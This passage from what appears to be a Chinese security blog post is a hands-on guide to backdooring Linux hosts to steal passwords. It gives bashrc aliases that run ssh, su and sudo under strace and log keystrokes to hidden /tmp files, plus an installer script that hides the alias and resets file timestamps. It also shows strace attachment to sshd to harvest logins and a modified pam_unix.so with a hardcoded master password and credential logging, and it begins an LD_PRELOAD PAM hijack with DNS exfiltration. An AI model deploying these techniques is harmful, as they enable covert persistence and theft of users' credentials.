<p><img src="https://images.atsud0.me/images/post/20220315-23:55:54-_5qr1yJ_image-20220315141013107_5qr1yJ_1647359754180_5qr1yJ_image-20220315141013107.png" alt="image-20220315141013107"></p>
<p>死循环,也许是耗尽了系统文件数后返回了 一开始的错误信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script: failed to create pseudo-terminal: No such file or directory</span><br></pre></td></tr></table></figure>

<p>另外上面说到有点难检测 因为,用户如果处于登录状态的话</p>
<p><img src="https://images.atsud0.me/images/post/20220315-15:08:43-_OQv8FC_image-20220315150418778_OQv8FC_1647328123930_OQv8FC_image-20220315150418778.png" alt="image-20220315150418778"></p>
<p>如果sb2ywa用户退出登录的话,再来查看文件内容,截然不同了:</p>
<p><img src="https://images.atsud0.me/images/post/20220315-15:09:03-_fPrMUx_image-20220315150535973_fPrMUx_1647328143552_fPrMUx_image-20220315150535973.png" alt="image-20220315150535973"></p>
<p>存在的问题:</p>
<ol>
<li>ssh登录无法记录,暂时不知道原因是什么</li>
<li>由于是追加记录 如果用户活动的时间比较久 cat了很多大文件,,那么相对应的 日志文件大小会十分的大.</li>
<li>需要script 2.35以上</li>
</ol>
<p>优点:</p>
<ol>
<li>较难发现.</li>
<li>没有过多的依赖</li>
</ol>
<h3 id="有意思的命令"><a href="#有意思的命令" class="headerlink" title="有意思的命令"></a>有意思的命令</h3><p>还记得前面的<code>-T</code>参数吗 这个是用来记录时序的,如果在执行<code>script</code>时带上这个参数,那我们就可以用<code>scriptreplay</code>或者是<code>scriptelive</code>命令来回放自己当时script操作的内容和终端输出.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#还可以使用-d来调整播放速度</span></span><br><span class="line">scriptreplay -B tmp.txt -T time.txt</span><br><span class="line">scriptlive  -t time.txt  -B tmp.txt</span><br></pre></td></tr></table></figure>



<h1 id="0x03-Strace-记录密码"><a href="#0x03-Strace-记录密码" class="headerlink" title="0x03 Strace 记录密码"></a>0x03 Strace 记录密码</h1><h2 id="安装strace"><a href="#安装strace" class="headerlink" title="安装strace"></a>安装strace</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install strace -y</span><br><span class="line">yum install strace -y</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong><a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man1/strace.1.html">strace</a></strong> is a diagnostic, debugging and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include system calls, signal deliveries, and changes of process state.</p>
<p>System administrators, diagnosticians and trouble-shooters will find it invaluable for solving problems with programs for which the source is not readily available since they do not need to be recompiled in order to trace them.</p>
</blockquote>
<p>strace 是一个集诊断、调试、统计于一体的工具,通常用来对程序的系统调用,信号传递的跟综结果对程序进行分析.而ptrace是一个Linux系统提供的一个对系统调用的拦截的一个系统调用函数.这个和本章内容关系不大 简单带过,我们只需要知道strace依赖于ptrace系统调用就行.</p>
<p>而我们可以通过strace获取进程的输入,自然也是依赖于ptrace,若ptrace被禁用,该攻击方式也无法使用.而yama是什么?Yama源码位于<code>security/yama/</code>,它基于LSM实现,管理员可以通过<code>/proc/sys/kernel/yama/ptrace_scope</code>来配置ptrace保护级别.</p>
<p>该项配置的详细说明:<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/security/Yama.txt">Yama</a></p>
<blockquote>
<p>Yama is a Linux Security Module that collects system-wide DAC security<br>protections that are not handled by the core kernel itself. This is<br>selectable at build-time with CONFIG_SECURITY_YAMA, and can be controlled<br>at run-time through sysctls in &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama:</p>
<ul>
<li><p>ptrace_scope</p>
</li>
<li><pre><code>
</code></pre>
</li>
</ul>
<p> The sysctl settings (writable only with CAP_SYS_PTRACE) are:</p>
<p>  0 - classic ptrace permissions: a process can PTRACE_ATTACH to any other<br>        process running under the same uid, as long as it is dumpable (i.e.<br>      did not transition uids, start privileged, or have called<br>      prctl(PR_SET_DUMPABLE…) already). Similarly, PTRACE_TRACEME is<br>      unchanged.</p>
<p>  1 - restricted ptrace: a process must have a predefined relationship with the inferior it wants to call PTRACE_ATTACH on. By default,this relationship is that of only its descendants when the above classic criteria is also met. To change the relationship, an inferior can call prctl(PR_SET_PTRACER, debugger, …) to declare an allowed debugger PID to call PTRACE_ATTACH on the inferior. Using PTRACE_TRACEME is unchanged.<br>    2 - admin-only attach: only processes with CAP_SYS_PTRACE may use ptrace with PTRACE_ATTACH, or through children calling PTRACE_TRACEME.</p>
<p>  3 - no attach: no processes may use ptrace with PTRACE_ATTACH nor via PTRACE_TRACEME. Once set, this sysctl value cannot be changed.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 classic 经典配置,可以以ptrace_attach到任何其他在同一uid下运行的进程,只要它是可转储的(比如无转换uid,没有特权,没有调用其他uid) 宽容模式</span><br><span class="line">1 restricted 限制级别,一个进程只能attach他有后代(子进程)</span><br><span class="line">2 admin-only 只限特权 拥有CAP_SYS_PTRACE能力的进程才可以使用ptrace</span><br><span class="line">3 no attach 完全禁用,不允许任何进程执行ptrace，一旦设置为该值，就不能再更改，即使root也不行。</span><br></pre></td></tr></table></figure>

<p>查看ptrace权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">或</span><br><span class="line">sysctl -a|grep ptrace</span><br></pre></td></tr></table></figure>

<p>修改ptrace权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">或</span><br><span class="line">sysctl -w kernel.yama.ptrace_scope=<span class="string">&quot;0&quot;</span>  &amp;&amp;  sysctl -p</span><br><span class="line"></span><br><span class="line">直接修改/etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当kernel.yama.ptrace_scope的值设置为3后，必须重启系统后才能更改</span></span><br></pre></td></tr></table></figure>



<p>strace常用参数</p>
<p>完整帮助手册:<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/strace.1.html">man:strace</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-p pid 跟踪指定进程pid</span><br><span class="line">-s strsize 指定输出的字符串的最大长度</span><br><span class="line">-o output 输出文件</span><br><span class="line">-e trace=read wirte 跟踪这两个系统调用 默认为all</span><br><span class="line">file 文件操作相关的系统调用</span><br><span class="line">process 进程控制相关的系统调用</span><br><span class="line">network 网络相关的系统调用</span><br><span class="line">ipc 进程通讯相关的系统调用</span><br><span class="line">还有很多系统调用....需要去阅读unix高级编程等相关书籍了..</span><br><span class="line">-t 在输出中的每一行前加上时间信息.</span><br><span class="line">-f 跟踪由fork调用所产生的子进程.</span><br><span class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.</span><br></pre></td></tr></table></figure>

<h2 id="方法一-strace启动进程"><a href="#方法一-strace启动进程" class="headerlink" title="方法一 strace启动进程"></a>方法一 strace启动进程</h2><p>方法一是修改<code>bashrc</code> 程序的别名,使运行指定程序时自动strace系统调用,收集键盘输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ssh</span></span><br><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date    &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect  -s 2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220315-21:57:07-_BenwFa_image-20220314223211793_BenwFa_1647352627688_BenwFa_image-20220314223211793.png" alt="image-20220314223211793"></p>
<p>Su虽然能正常记录,但是会一直提示权限认证失败.如果需要正常使用的话则需要给strace添加suid权限…(是否有点…)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> su=<span class="string">&#x27;strace -o /tmp/supwd-`date    &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write -s 32 su&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> sudo=<span class="string">&#x27;strace -o /tmp/sudopwd-`date    &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write -s 32 sudo&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220314-22:31:15-_biFBRR_image-20220314223115052_biFBRR_1647268275404_biFBRR_image-20220314223115052.png" alt="image-20220314223115052"></p>
<p>直接在codzhz佬的脚本基础上简单改改就能获得一个在bashrc中隐藏alias的脚本(但是执行alias的话还是暴露..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># CUSTIMIZE BEFORE UPLOAD</span></span><br><span class="line"></span><br><span class="line">fakerc=~/.bash_login</span><br><span class="line">logfile=~/.bash_cache</span><br><span class="line">waitsec=1</span><br><span class="line">changetime=$(<span class="built_in">stat</span> -c %Y ~/.bashrc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> script &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">exec bash --rcfile $fakerc</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment">#read script &lt;&lt; EOF</span></span><br><span class="line"><span class="comment">#exec script -B &quot;$logfile&quot; -afqc &quot;bash --rcfile $fakerc&quot;</span></span><br><span class="line"><span class="comment">#EOF</span></span><br><span class="line">quoted=$(<span class="built_in">printf</span> <span class="string">&quot;%q&quot;</span> <span class="string">&quot;<span class="variable">$script</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UI BEGIN</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span></span>() &#123; <span class="built_in">echo</span> -e <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">printvar</span></span>() &#123; <span class="built_in">printf</span> <span class="string">&quot; + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n&quot;</span> <span class="variable">$1</span> <span class="string">&quot;<span class="variable">$&#123;!1&#125;</span>&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">printvar fakerc</span><br><span class="line">printvar logfile</span><br><span class="line">printvar script</span><br><span class="line">printvar quoted</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\e[5;7m  wait for \e[1m<span class="variable">$waitsec</span>\e[0;5;7m secs, ctrl+c to interrupt  \e[m&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="variable">$waitsec</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;installing...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># UI END</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; <span class="string">&quot;<span class="variable">$fakerc</span>&quot;</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">self=\$(cat &quot;$fakerc&quot;)</span></span><br><span class="line"><span class="string">self=\$(printf &quot;%q&quot; &quot;\$self&quot;)</span></span><br><span class="line"><span class="string">rm -f &quot;$fakerc&quot;</span></span><br><span class="line"><span class="string">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect  -s 2048 ssh&#x27;</span></span><br><span class="line"><span class="string">sed -i &quot;/^exec bash/d&quot; ~/.bashrc</span></span><br><span class="line"><span class="string">touch -d @$changetime ~/.bashrc</span></span><br><span class="line"><span class="string">trap &quot;echo $quoted &gt;&gt; ~/.bashrc &amp;&amp; echo \$self &gt; &#x27;$fakerc&#x27;&quot; EXIT</span></span><br><span class="line"><span class="string">unset self</span></span><br><span class="line"><span class="string">. ~/.bashrc</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$script</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>







<h2 id="方法二-strace-已有进程"><a href="#方法二-strace-已有进程" class="headerlink" title="方法二 strace 已有进程"></a>方法二 strace 已有进程</h2><p>这个操作需要root权限.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep <span class="string">&quot;sshd -D&quot;</span>|grep -v grep|awk &#123;<span class="string">&#x27;print $2&#x27;</span>&#125;` -t -e trace=<span class="built_in">read</span>,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#匹配密码</span></span><br><span class="line">grep -E <span class="string">&#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27;</span> /tmp/.sshd.log</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://images.atsud0.me/images/post/20220315-21:54:57-_ynWGMO_image-20220315173815033_ynWGMO_1647352497354_ynWGMO_image-20220315173815033.png" alt="image-20220315173815033"></p>
<p>所以其实strace bash进程也是可以的…(就是数据特别多)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep <span class="string">&#x27;\-bash&#x27;</span>|grep -v <span class="string">&#x27;grep&#x27;</span>|grep -v <span class="string">&#x27;root&#x27;</span>|awk &#123;<span class="string">&#x27;print $2&#x27;</span>&#125;` -t -e trace=<span class="built_in">read</span>,write -s 4096 2&gt; /tmp/.bash.log2 &amp;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220315-19:34:28-_IAMfpq_image-20220315193428120_IAMfpq_1647344068432_IAMfpq_image-20220315193428120.png" alt="image-20220315193428120"></p>
<h1 id="0x04-PAM记录密码"><a href="#0x04-PAM记录密码" class="headerlink" title="0x04 PAM记录密码"></a>0x04 PAM记录密码</h1><p>PAM(Pluggable Authentication Modules)是Linux系统上用户对用户进行身份验证对身份验证基础结构.感觉相当于Windows的SSP.</p>
<p>在之前的文章,我们使用了PAM添加了一个google验证码:<a href="https://atsud0.me/2021/09/18/Linux%E6%B7%BB%E5%8A%A0Google%E9%AA%8C%E8%AF%81/">Linux添加Google验证</a>,这次试试使用PAM添加记录密码的后门.</p>
<p>先来查询下pam版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># redhat or centos</span></span><br><span class="line">rpm -qa | grep pam</span><br><span class="line"><span class="comment"># debian ubuntu kali ...</span></span><br><span class="line">dpkg -l | grep pam</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220315-21:54:51-_usx8Hv_image-20220315215423458_usx8Hv_1647352491113_usx8Hv_image-20220315215423458.png" alt="image-20220315215423458"></p>
<h2 id="替换pam-unix-so"><a href="#替换pam-unix-so" class="headerlink" title="替换pam_unix.so"></a>替换pam_unix.so</h2><p>感觉在实战中,这个相当的受限.. </p>
<h3 id="手动编译替换"><a href="#手动编译替换" class="headerlink" title="手动编译替换"></a>手动编译替换</h3><p>下载系统对应的PAM版本源码并解压</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar xzf v1.4.0.tar.gz</span><br><span class="line">cd linux-pam-1.4.0/modules/pam_unix/</span><br><span class="line">vim pam_unix_auth.c</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/20220317-00:59:11-_uvm6NG_image-20220317005901537_uvm6NG_1647449951681_uvm6NG_image-20220317005901537.png" alt="image-20220317005901537"></p>
<p>可以在这里修改认证逻辑，改成使用万能密码的后门，或是记录密码的功能。</p>
<p><img src="https://images.atsud0.me/images/post/20220317-01:02:49-_xfXWIH_image-20220317010249387_xfXWIH_1647450169750_xfXWIH_image-20220317010249387.png" alt="image-20220317010249387"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//万能密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;atsud0&quot;</span>, p) == <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//记录密码</span></span><br><span class="line"><span class="keyword">if</span>(retval == PAM_SUCCESS)&#123;</span><br><span class="line">    FILE * fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;/tmp/.pass.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;username: %s , password: %s \n&quot;</span>, name, p);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">name = p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">AUTH_RETURN;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220317-01:08:20-_r0lt3L_image-20220317010820283_r0lt3L_1647450500568_r0lt3L_image-20220317010820283.png" alt="image-20220317010820283"></p>
<p>安装依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt install automake pkg-config make</span><br><span class="line"></span><br><span class="line">#提示yacc command not found</span><br><span class="line">apt install bison</span><br><span class="line">apt install byacc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-pam-1.4.0</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译好的在<code>/linux-pam-1.4.0/modules/pam_unix/.libs/</code>下</p>
<p>系统不同位数不同pam_unix.so路径也不一样,可以使用find命令去寻找.备份原pam_unix.so后替换即可.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;pam_unix.so&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220317-02:45:54-_MYrMGc_image-20220317020750487_MYrMGc_1647456354315_MYrMGc_image-20220317020750487.png" alt="image-20220317020750487"></p>
<p>替换后,使用”atsud0”即可登录系统.同时用户的密码也能记录在&#x2F;tmp&#x2F;.pass.log:</p>
<p><img src="https://images.atsud0.me/images/post/20220317-02:09:17-_doRw0z_image-20220317020917139_doRw0z_1647454157443_doRw0z_image-20220317020917139.png" alt="image-20220317020917139"></p>
<p><strong>若目标系统不存在编译的环境,我们可以自己在外部系统上编译后上传.</strong></p>
<p>修改时间戳</p>
<p><img src="https://images.atsud0.me/images/post/20220317-02:12:57-_6snF3G_image-20220317021257527_6snF3G_1647454377830_6snF3G_image-20220317021257527.png" alt="image-20220317021257527"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch  pam_unix.so  -r  pam_issue.so</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220317-02:14:20-_SLzS1K_image-20220317021420223_SLzS1K_1647454460526_SLzS1K_image-20220317021420223.png" alt="image-20220317021420223"></p>
<h3 id="脚本一键编译"><a href="#脚本一键编译" class="headerlink" title="脚本一键编译"></a>脚本一键编译</h3><p>使用9bie大佬的改过的脚本:<a target="_blank" rel="noopener" href="https://github.com/9bie/linux-pam-backdoor">9bie&#x2F;linux-pam-backdoor</a> </p>
<p>这里指定版本后,会去<a target="_blank" rel="noopener" href="http://www.linux-pam.org/library/">PAM-SourceCode-Library</a>中对应版本的源码 然后下载回来编译..不过我环境是1.4.0,,好像这里替换成1.3.0之后也没什么影响??(但是还是建议尽量保持一致)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.sh -m save -v 1.3.0 -o /tmp/save.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220315-22:46:28-_IubFhD_image-20220315224550349_IubFhD_1647355588644_IubFhD_image-20220315224550349.png" alt="image-20220315224550349"></p>
<p>除了可以记录密码,也可以实现万能密码登录.</p>
<h2 id="PAM和LD-PRELOAD劫持结合DNS带外发送密码"><a href="#PAM和LD-PRELOAD劫持结合DNS带外发送密码" class="headerlink" title="PAM和LD_PRELOAD劫持结合DNS带外发送密码"></a>PAM和LD_PRELOAD劫持结合DNS带外发送密码</h2><p>这里简单介绍下<code>LD_PRELOAD</code>.<code>LD_PRELOAD</code>其实是动态链接的一个环境变量。而动态链接器则是:</p>
<blockquote>
<p>动态链接器是操作系统的一部分，负责按照<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F">可执行程序</a><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BF%90%E8%A1%8C%E6%97%B6">运行时</a>的需要装入与链接<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E5%BA%93">共享库</a>。装入是指把共享库在永久存储上的内容复制到内存，链接是指填充跳转表（jump table）与重定位指针。 </p>
</blockquote>
<p>当程序需要使用动态链接库里的函数时,由ld.so复制加载. 它会先去根据以下顺序去搜索并加载</p>
<ul>
<li>加载环境变量LD_PRELOAD指定的动态库</li>
<li>加载文件&#x2F;etc&#x2F;ld.so.preload指定的动态库</li>
<li>搜索环境变量LD_LIBRARY_PATH指定的动态库搜索路径</li>
<li>搜索路径&#x2F;lib64下的动态库文件</li>
</ul>
<blockquote>
<p>注意：ld.so.conf 是编译程序时找链接库的配置文件</p>
</blockquote>
<p>了解完了动态链接的加载顺序, 那么我们再接着来了解一个pam_get_item函数.</p>
<blockquote>
<p>The pam_get_item function allows applications and PAM servicemodules to access and retrieve PAM informations of item_type.</p>
<p>Upon successful return, item contains a pointer to the value of the corresponding item. Note, this is a pointer to the actual data and should not be free()’ed or over-written! The following values are supported for item_type</p>
</blockquote>
<p>Pam_get_item是让应用和pam模块去获取pam信息的，当item_type定义为pam_authok时，将会使用<code>pam_sm_authenticate</code> 和 <code>pam_sm_chauthtok</code>去传递身份令牌。</p>
<p>而pam_get_user是用来获取用户名的。</p>
<blockquote>
<p>If a service module wishes to obtain the name of the user, it hould not use this function, but instead perform a call to pam_get_user(3).<br>Only a service module is privileged to read the authentication tokens, PAM_AUTHTOK and PAM_OLDAUTHTOK.</p>
</blockquote>
<p>并且只有服务模块的时候才可以读取认证凭据。</p>
<p>所以我们可以通过劫持pam_get_item来收集凭据。</p>
<p>DNS部分代码来自: <a target="_blank" rel="noopener" href="https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168">https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168</a></p>
<p>PAM_get_item劫持部分代码来自: <a target="_blank" rel="noopener" href="https://x-c3ll.github.io/posts/PAM-backdoor-DNS/">https://x-c3ll.github.io/posts/PAM-backdoor-DNS/</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 